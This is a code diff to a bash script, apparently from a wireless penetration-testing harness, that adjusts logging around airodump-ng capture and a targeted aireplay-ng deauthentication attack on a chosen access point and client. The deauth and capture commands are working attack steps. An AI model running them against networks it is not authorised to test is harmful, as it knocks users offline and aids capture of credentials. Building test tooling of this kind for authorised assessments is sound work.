@@ -73,7 +73,7 @@ LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
 TELEMETRY_PID=$!
 
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" 2>&1 | tee "$LOG_FILE" &
+    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" &
 else
     airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
 fi
@@ -84,9 +84,11 @@ sleep 5
 echo -e "[*] Sending surgical deauthentication frames to ${C_VAR}$TARGET_CLIENT${C_RESET}..."
 DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>&1 | tee "$DEAUTH_LOG" || true
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
 else
-    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 &
+    TOOL_PID=$!
+    wait $TOOL_PID || true
 fi
 
 # 3. Wait & Analyze
